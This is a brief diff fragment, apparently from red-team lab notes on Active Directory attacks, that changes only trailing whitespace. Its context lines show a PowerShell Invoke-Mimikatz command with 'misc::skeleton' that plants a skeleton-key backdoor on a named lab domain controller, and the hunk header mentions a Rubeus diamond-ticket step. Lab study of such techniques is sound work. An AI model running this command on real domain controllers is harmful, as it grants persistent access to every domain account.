@@ -223,5 +223,4 @@ Rubeus.exe diamond
 ```powershell
 Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
 ```
-
-
+ 
